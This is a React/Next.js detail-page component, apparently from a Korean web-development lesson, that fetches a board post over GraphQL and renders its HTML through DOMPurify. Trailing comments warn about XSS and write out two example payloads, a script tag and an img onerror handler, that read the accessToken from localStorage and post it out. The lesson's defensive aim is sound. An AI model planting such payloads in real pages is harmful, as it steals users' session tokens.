import { useQuery, gql } from "@apollo/client";
import { useRouter } from "next/router";
import DOMPurify from "dompurify";

const FETCH_BOARDS = gql`
  query fetchBoard($boardId: ID!) {
    fetchBoard(boardId: $boardId) {
      _id
      writer
      title
      contents
    }
  }
`;
export default function WebEditorDetailPage() {
  const router = useRouter();
  const { data } = useQuery(FETCH_BOARDS, {
    variables: { boardId: router.query.id },
  });
  return (
    <>
      <div>작성자: {data?.fetchBoard.writer}</div>
      <div>제목: {data?.fetchBoard.title}</div>
      {/* <div>내용: {data?.fetchBoard.contents}</div> */}
      {typeof window !== "undefined" && (
        <div
          dangerouslySetInnerHTML={{
            __html: DOMPurify.sanitize(data?.fetchBoard.contents),
          }}
        ></div>
      )}
    </>
  );
}
// {
//   /* <script>

// const aaa = localStorage.getItem("accessToken")

// axios.port(백엔드주소,{aaa})

// </script> */
// }

//  dangerouslySetInnerHTML 는 위험한 방법

// Cross-Site-Script => XSS

// 이미지 타입으로 해킹 기법
// "<img src='#' onerror='console.log(localStorage.getItem(\"accessToken\")); axios.post()' />"
